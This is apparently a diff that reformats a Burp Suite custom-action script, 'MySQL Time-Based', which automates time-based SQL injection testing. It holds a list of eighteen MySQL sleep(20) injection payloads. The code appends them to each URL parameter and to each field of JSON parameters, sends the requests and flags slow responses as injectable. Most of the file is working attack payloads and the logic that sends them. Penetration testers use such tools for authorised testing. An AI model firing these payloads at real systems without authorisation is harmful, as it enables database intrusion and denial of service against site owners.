@@ -3,252 +3,253 @@ name: MySQL Time-Based
 function: CUSTOM_ACTION
 location: REPEATER
 source: |+
-	/**
-	* Append a time-based MySQL payload to each query parameter, one at a time.
-	* Sends each mutated request sequentially and logs high-level timing data
-	* so you can watch for slow responses in Logger or the console.
-	* Also reports the findings to the Issues dashboard.
-	* Handles both regular parameters and JSON-encoded parameters.
-	* @author slicingmelon
-	**/
+  /**
+  * Append a time-based MySQL payload to each query parameter, one at a time.
+  * Sends each mutated request sequentially and logs high-level timing data
+  * so you can watch for slow responses in Logger or the console.
+  * Also reports the findings to the Issues dashboard.
+  * Handles both regular parameters and JSON-encoded parameters.
+  * @author slicingmelon
+  **/
 
-	var payloads = java.util.List.of(
-		"'XOR(if(now()=sysdate(),sleep(20),0))XOR'Z",
-		"'XOR(if(isnull(nullif(now(),sysdate())),sleep(20),0))XOR'Z",
-		"'(select(1)from(select(sleep(20)))a)'",
-		"(select(1)from(select(sleep(20)))a)",
-		"(select(1)from(select(sleep(20)))a)-- z",
-		"'+(select(1)from(select(sleep(20)))a)+'",
-		"-(select(1)from(select(sleep(20)))a)",
-		",(select(1)from(select(sleep(20)))a)",
-		",(select(1)from(select(sleep(20)))a)-- z",
-		"'OR(select(1)from(select(sleep(20)))a)OR'Z",
-		"'AND(select(1)from(select(sleep(20)))a)AND'Z",
-		" AND (select(1)from(select(sleep(20)))a)-- z",
-		"' AND (select(1)from(select(sleep(20)))a)-- z",
-		") AND (select(1)from(select(sleep(20)))a)-- z",
-		"') AND (select(1)from(select(sleep(20)))a)-- z",
-		"->test\"',(select(1)from(select(sleep(20)))a)-- z\"'",
-		"->test\"'))# (select(1)from(select(sleep(20)))a)-- z",
-		"->test\"' ASC, (select(1)from(select(sleep(20)))a)) DESC-- z\"'"
-	);
+  var payloads = java.util.List.of(
+    "'XOR(if(now()=sysdate(),sleep(20),0))XOR'Z",
+    "'XOR(if(isnull(nullif(now(),sysdate())),sleep(20),0))XOR'Z",
+    "'(select(1)from(select(sleep(20)))a)'",
+    "(select(1)from(select(sleep(20)))a)",
+    "(select(1)from(select(sleep(20)))a)-- z",
+    "'+(select(1)from(select(sleep(20)))a)+'",
+    "-(select(1)from(select(sleep(20)))a)",
+    ",(select(1)from(select(sleep(20)))a)",
+    ",(select(1)from(select(sleep(20)))a)-- z",
+    "'OR(select(1)from(select(sleep(20)))a)OR'Z",
+    "'AND(select(1)from(select(sleep(20)))a)AND'Z",
+    " AND (select(1)from(select(sleep(20)))a)-- z",
+    "' AND (select(1)from(select(sleep(20)))a)-- z",
+    ") AND (select(1)from(select(sleep(20)))a)-- z",
+    "') AND (select(1)from(select(sleep(20)))a)-- z",
+    "->test\"',(select(1)from(select(sleep(20)))a)-- z\"'",
+    "->test\"'))# (select(1)from(select(sleep(20)))a)-- z",
+    "->test\"' ASC, (select(1)from(select(sleep(20)))a)) DESC-- z\"'"
+  );
 
-	var bypassCache = true;
-	var detectionThresholdMs = 20000L;
+  var bypassCache = true;
+  var detectionThresholdMs = 20000L;
 
-	var detectionFound = false;
+  var detectionFound = false;
 
-	// Custom URL encode - only encodes space, +, #, = (characters that break URL structure)
-	var customUrlEncode = (java.util.function.Function<String, String>)(str -> {
-		return str.replace(" ", "%20")
-							.replace("+", "%2b")
-							.replace("#", "%23")
-							.replace("=", "%3D");
-	});
+  // Custom URL encode - only encodes space, +, #, = (characters that break URL structure)
+  var customUrlEncode = (java.util.function.Function<String, String>)(str -> {
+    return str.replace(" ", "%20")
+              .replace("+", "%2b")
+              .replace("#", "%23")
+              .replace("=", "%3D");
+  });
 
-	// Helper function to inject payload into a JSON string
-	var injectIntoJson = (java.util.function.BiFunction<String, String, java.util.List<java.util.Map.Entry<String, String>>>)((jsonStr, payload) -> {
-		var results = new java.util.ArrayList<java.util.Map.Entry<String, String>>();
-		try {
-			var jsonNode = JsonNode.jsonNode(jsonStr);
-			var jsonObj = jsonNode.asObject();
-			var jsonMap = jsonObj.asMap();
-			
-			// Iterate through each field in the JSON object
-			for (var entry : jsonMap.entrySet()) {
-				String targetKey = entry.getKey();
-				
-				// Create a new JSON object with payload injected into this field
-				var newJsonObj = JsonObjectNode.jsonObjectNode();
-				
-				for (var e : jsonMap.entrySet()) {
-					String k = e.getKey();
-					var valueNode = e.getValue();
-					
-					// Get string value from the node
-					String valueStr = "";
-					if (valueNode.isString()) {
-						valueStr = valueNode.asString();
-					} else if (valueNode.isNull()) {
-						valueStr = "";
-					} else {
-						valueStr = valueNode.toJsonString();
-					}
-					
-					if (k.equals(targetKey)) {
-						// Inject payload into this field
-						newJsonObj.putString(k, valueStr + payload);
-					} else {
-						// Keep original value
-						newJsonObj.putString(k, valueStr);
-					}
-				}
-				
-				// Convert to JSON string
-				String mutatedJsonStr = newJsonObj.toJsonString();
-				results.add(new java.util.AbstractMap.SimpleEntry<>(targetKey, mutatedJsonStr));
-			}
-		} catch (Exception e) {
-			logging().logToError("[MySQLTimeBased] Failed to parse JSON: " + e.getMessage());
-		}
-		return results;
-	});
+  // Helper function to inject payload into a JSON string
+  var injectIntoJson = (java.util.function.BiFunction<String, String, java.util.List<java.util.Map.Entry<String, String>>>)((jsonStr, payload) -> {
+    var results = new java.util.ArrayList<java.util.Map.Entry<String, String>>();
+    try {
+      var jsonNode = JsonNode.jsonNode(jsonStr);
+      var jsonObj = jsonNode.asObject();
+      var jsonMap = jsonObj.asMap();
+      
+      // Iterate through each field in the JSON object
+      for (var entry : jsonMap.entrySet()) {
+        String targetKey = entry.getKey();
+        
+        // Create a new JSON object with payload injected into this field
+        var newJsonObj = JsonObjectNode.jsonObjectNode();
+        
+        for (var e : jsonMap.entrySet()) {
+          String k = e.getKey();
+          var valueNode = e.getValue();
+          
+          // Get string value from the node
+          String valueStr = "";
+          if (valueNode.isString()) {
+            valueStr = valueNode.asString();
+          } else if (valueNode.isNull()) {
+            valueStr = "";
+          } else {
+            valueStr = valueNode.toJsonString();
+          }
+          
+          if (k.equals(targetKey)) {
+            // Inject payload into this field
+            newJsonObj.putString(k, valueStr + payload);
+          } else {
+            // Keep original value
+            newJsonObj.putString(k, valueStr);
+          }
+        }
+        
+        // Convert to JSON string
+        String mutatedJsonStr = newJsonObj.toJsonString();
+        results.add(new java.util.AbstractMap.SimpleEntry<>(targetKey, mutatedJsonStr));
+      }
+    } catch (Exception e) {
+      logging().logToError("[MySQLTimeBased] Failed to parse JSON: " + e.getMessage());
+    }
+    return results;
+  });
 
-	var baseRequest = requestResponse.request();
-	if (baseRequest == null) return;
+  var baseRequest = requestResponse.request();
+  if (baseRequest == null) return;
 
-	// Get all URL parameters (order preserved by Montoya API)
-	var urlParameters = baseRequest.parameters().stream()
-		.filter(p -> p.type() == HttpParameterType.URL)
-		.toList();
+  // Get all URL parameters (order preserved by Montoya API)
+  var urlParameters = baseRequest.parameters().stream()
+    .filter(p -> p.type() == HttpParameterType.URL)
+    .toList();
 
-	if (urlParameters.isEmpty()) {
-		logging().logToOutput("[MySQLTimeBased] No URL parameters found.");
-		return;
-	}
+  if (urlParameters.isEmpty()) {
+    logging().logToOutput("[MySQLTimeBased] No URL parameters found.");
+    return;
+  }
 
-	var alphabet = "abcdefghijklmnopqrstuvwxyz0123456789";
+  var alphabet = "abcdefghijklmnopqrstuvwxyz0123456789";
 
-	logging().logToOutput("[MySQLTimeBased] Started...");
+  logging().logToOutput("[MySQLTimeBased] Started...");
 
-	for (HttpParameter parameter : urlParameters) {
-		String name = parameter.name();
-		String value = parameter.value();
-		
-		// URL decode the value to check if it's JSON
-		var decodedValue = api().utilities().urlUtils().decode(value);
-		
-		// Check if it's a JSON object
-		if (decodedValue != null && !decodedValue.isEmpty() && 
-				decodedValue.strip().startsWith("{") && decodedValue.strip().endsWith("}") &&
-				api().utilities().jsonUtils().isValidJson(decodedValue)) {
-			// Handle JSON parameter - inject into each JSON field
-			logging().logToOutput("[MySQLTimeBased] Detected JSON parameter: " + name);
-			
-			for (String payload : payloads) {
-				var jsonMutations = injectIntoJson.apply(decodedValue, payload);
-				
-				for (var jsonMutation : jsonMutations) {
-					var jsonField = jsonMutation.getKey();
-					var mutatedJson = jsonMutation.getValue();
-					
-					// URL encode the mutated JSON (standard encoding for JSON)
-					var encodedMutatedJson = api().utilities().urlUtils().encode(mutatedJson);
-					
-				// Create new parameter with mutated JSON
-				var newParam = HttpParameter.urlParameter(name, encodedMutatedJson);
-				
-				// Update parameter in place (order preserved!)
-				var mutatedRequest = baseRequest.withParameter(newParam);
-					
-					// Add cache buster if enabled
-					if (bypassCache) {
-						var cacheBuster = api().utilities().randomUtils().randomString(14, alphabet);
-						mutatedRequest = mutatedRequest.withAddedParameters(
-							HttpParameter.urlParameter("_czb", cacheBuster)
-						);
-					}
-					
-					var result = api().http().sendRequest(mutatedRequest);
-					if (!result.hasResponse()) {
-						logging().logToOutput("[WARN] No response for param " + name + " (JSON field: " + jsonField + ")");
-						continue;
-					}
-					
-					var timingOpt = result.timingData();
-					if (timingOpt.isEmpty()) continue;
-					
-					var timing = timingOpt.get();
-					java.time.Duration tStart = timing.timeBetweenRequestSentAndStartOfResponse();
-					java.time.Duration tEnd = timing.timeBetweenRequestSentAndEndOfResponse();
-					long startMs = (tStart != null ? tStart.toMillis() : -1);
-					long endMs = (tEnd != null ? tEnd.toMillis() : -1);
-					
-					if (startMs >= detectionThresholdMs && startMs != -1) {
-						logging().logToOutput("[MySQLTimeBased] SQL injection detected in JSON param " + name + ", field: " + jsonField + ", payload: " + payload);
-						//httpEditor.responsePane().set(result.response().toByteArray());
-						//httpEditor.requestPane().set(mutatedRequest.toByteArray());
-						detectionFound = true;
-						
-						var detail = String.format("JSON parameter '%s', field '%s' was vulnerable to time-based SQL injection when payload '%s' was used (response took %dms).", name, jsonField, payload, endMs);
-						api().siteMap().add(
-							burp.api.montoya.scanner.audit.issues.AuditIssue.auditIssue(
-								"MySQL Time Based Injection (JSON)",
-								detail,
-								"Sanitize input to prevent SQL injections.",
-								mutatedRequest.url(),
-								burp.api.montoya.scanner.audit.issues.AuditIssueSeverity.HIGH,
-								burp.api.montoya.scanner.audit.issues.AuditIssueConfidence.CERTAIN,
-								"",
-								"",
-								burp.api.montoya.scanner.audit.issues.AuditIssueSeverity.HIGH,
-								result
-							)
-						);
-					}
-				}
-			}
-		} else {
-			// Handle regular parameter - inject directly
-			for (String payload : payloads) {
-				// Custom URL encode the payload (only space, +, #, =)
-				var encodedPayload = customUrlEncode.apply(payload);
-				
-			// Create new parameter with payload appended
-			var newParam = HttpParameter.urlParameter(name, value + encodedPayload);
-			
-			// Update parameter in place (order preserved!)
-			var mutatedRequest = baseRequest.withParameter(newParam);
-				
-				// Add cache buster if enabled
-				if (bypassCache) {
-					var cacheBuster = api().utilities().randomUtils().randomString(14, alphabet);
-					mutatedRequest = mutatedRequest.withAddedParameters(
-						HttpParameter.urlParameter("_czb", cacheBuster)
-					);
-				}
-				
-				var result = api().http().sendRequest(mutatedRequest);
-				if (!result.hasResponse()) {
-					logging().logToOutput("[WARN] No response for param " + name);
-					continue;
-				}
-				
-				var timingOpt = result.timingData();
-				if (timingOpt.isEmpty()) continue;
-				
-				var timing = timingOpt.get();
-				java.time.Duration tStart = timing.timeBetweenRequestSentAndStartOfResponse();
-				java.time.Duration tEnd = timing.timeBetweenRequestSentAndEndOfResponse();
-				long startMs = (tStart != null ? tStart.toMillis() : -1);
-				long endMs = (tEnd != null ? tEnd.toMillis() : -1);
-				
-				if (startMs >= detectionThresholdMs && startMs != -1) {
-					logging().logToOutput("[MySQLTimeBased] SQL injection detected in param " + name + " using payload: " + payload);
-					//httpEditor.responsePane().set(result.response().toByteArray());
-					//httpEditor.requestPane().set(mutatedRequest.toByteArray());
-					detectionFound = true;
-					
-					var detail = String.format("Parameter '%s' was vulnerable to time-based SQL injection when payload '%s' was used (response took %dms).", name, payload, endMs);
-					api().siteMap().add(
-						burp.api.montoya.scanner.audit.issues.AuditIssue.auditIssue(
-							"MySQL Time Based Injection",
-							detail,
-							"Sanitize input to prevent SQL injections.",
-							mutatedRequest.url(),
-							burp.api.montoya.scanner.audit.issues.AuditIssueSeverity.HIGH,
-							burp.api.montoya.scanner.audit.issues.AuditIssueConfidence.CERTAIN,
-							"",
-							"",
-							burp.api.montoya.scanner.audit.issues.AuditIssueSeverity.HIGH,
-							result
-						)
-					);
-				}
-			}
-		}
-	}
+  for (HttpParameter parameter : urlParameters) {
+    String name = parameter.name();
+    String value = parameter.value();
+    
+    // URL decode the value to check if it's JSON
+    var decodedValue = api().utilities().urlUtils().decode(value);
+    
+    // Check if it's a JSON object
+    if (decodedValue != null && !decodedValue.isEmpty() && 
+        decodedValue.strip().startsWith("{") && decodedValue.strip().endsWith("}") &&
+        api().utilities().jsonUtils().isValidJson(decodedValue)) {
+      // Handle JSON parameter - inject into each JSON field
+      logging().logToOutput("[MySQLTimeBased] Detected JSON parameter: " + name);
+      
+      for (String payload : payloads) {
+        var jsonMutations = injectIntoJson.apply(decodedValue, payload);
+        
+        for (var jsonMutation : jsonMutations) {
+          var jsonField = jsonMutation.getKey();
+          var mutatedJson = jsonMutation.getValue();
+          
+          // URL encode the mutated JSON (standard encoding for JSON)
+          var encodedMutatedJson = api().utilities().urlUtils().encode(mutatedJson);
+          
+          // Create new parameter with mutated JSON
+          var newParam = HttpParameter.urlParameter(name, encodedMutatedJson);
+          
+          // Update parameter in place (order preserved!)
+          var mutatedRequest = baseRequest.withParameter(newParam);
+          
+          // Add cache buster if enabled
+          if (bypassCache) {
+            var cacheBuster = api().utilities().randomUtils().randomString(14, alphabet);
+            mutatedRequest = mutatedRequest.withAddedParameters(
+              HttpParameter.urlParameter("_czb", cacheBuster)
+            );
+          }
+          
+          var result = api().http().sendRequest(mutatedRequest);
+          if (!result.hasResponse()) {
+            logging().logToOutput("[WARN] No response for param " + name + " (JSON field: " + jsonField + ")");
+            continue;
+          }
+          
+          var timingOpt = result.timingData();
+          if (timingOpt.isEmpty()) continue;
+          
+          var timing = timingOpt.get();
+          java.time.Duration tStart = timing.timeBetweenRequestSentAndStartOfResponse();
+          java.time.Duration tEnd = timing.timeBetweenRequestSentAndEndOfResponse();
+          long startMs = (tStart != null ? tStart.toMillis() : -1);
+          long endMs = (tEnd != null ? tEnd.toMillis() : -1);
+          
+          if (startMs >= detectionThresholdMs && startMs != -1) {
+            logging().logToOutput("[MySQLTimeBased] SQL injection detected in JSON param " + name + ", field: " + jsonField + ", payload: " + payload);
+            //httpEditor.responsePane().set(result.response().toByteArray());
+            //httpEditor.requestPane().set(mutatedRequest.toByteArray());
+            detectionFound = true;
+            
+            var detail = String.format("JSON parameter '%s', field '%s' was vulnerable to time-based SQL injection when payload '%s' was used (response took %dms).", name, jsonField, payload, endMs);
+            api().siteMap().add(
+              burp.api.montoya.scanner.audit.issues.AuditIssue.auditIssue(
+                "MySQL Time Based Injection (JSON)",
+                detail,
+                "Sanitize input to prevent SQL injections.",
+                mutatedRequest.url(),
+                burp.api.montoya.scanner.audit.issues.AuditIssueSeverity.HIGH,
+                burp.api.montoya.scanner.audit.issues.AuditIssueConfidence.CERTAIN,
+                "",
+                "",
+                burp.api.montoya.scanner.audit.issues.AuditIssueSeverity.HIGH,
+                result
+              )
+            );
+          }
+        }
+      }
+    } else {
+      // Handle regular parameter - inject directly
+      for (String payload : payloads) {
+        // Custom URL encode the payload (only space, +, #, =)
+        var encodedPayload = customUrlEncode.apply(payload);
+        
+        // Create new parameter with payload appended
+        var newParam = HttpParameter.urlParameter(name, value + encodedPayload);
+        
+        // Update parameter in place (order preserved!)
+        var mutatedRequest = baseRequest.withParameter(newParam);
+        
+        // Add cache buster if enabled
+        if (bypassCache) {
+          var cacheBuster = api().utilities().randomUtils().randomString(14, alphabet);
+          mutatedRequest = mutatedRequest.withAddedParameters(
+            HttpParameter.urlParameter("_czb", cacheBuster)
+          );
+        }
+        
+        var result = api().http().sendRequest(mutatedRequest);
+        if (!result.hasResponse()) {
+          logging().logToOutput("[WARN] No response for param " + name);
+          continue;
+        }
+        
+        var timingOpt = result.timingData();
+        if (timingOpt.isEmpty()) continue;
+        
+        var timing = timingOpt.get();
+        java.time.Duration tStart = timing.timeBetweenRequestSentAndStartOfResponse();
+        java.time.Duration tEnd = timing.timeBetweenRequestSentAndEndOfResponse();
+        long startMs = (tStart != null ? tStart.toMillis() : -1);
+        long endMs = (tEnd != null ? tEnd.toMillis() : -1);
+        
+        if (startMs >= detectionThresholdMs && startMs != -1) {
+          logging().logToOutput("[MySQLTimeBased] SQL injection detected in param " + name + " using payload: " + payload);
+          //httpEditor.responsePane().set(result.response().toByteArray());
+          //httpEditor.requestPane().set(mutatedRequest.toByteArray());
+          detectionFound = true;
+          
+          var detail = String.format("Parameter '%s' was vulnerable to time-based SQL injection when payload '%s' was used (response took %dms).", name, payload, endMs);
+          api().siteMap().add(
+            burp.api.montoya.scanner.audit.issues.AuditIssue.auditIssue(
+              "MySQL Time Based Injection",
+              detail,
+              "Sanitize input to prevent SQL injections.",
+              mutatedRequest.url(),
+              burp.api.montoya.scanner.audit.issues.AuditIssueSeverity.HIGH,
+              burp.api.montoya.scanner.audit.issues.AuditIssueConfidence.CERTAIN,
+              "",
+              "",
+              burp.api.montoya.scanner.audit.issues.AuditIssueSeverity.HIGH,
+              result
+            )
+          );
+        }
+      }
+    }
+  }
 
-	if (!detectionFound) {
-		logging().logToOutput("[MySQLTimeBased] No findings.");
-	}
+  if (!detectionFound) {
+    logging().logToOutput("[MySQLTimeBased] No findings.");
+  }
+
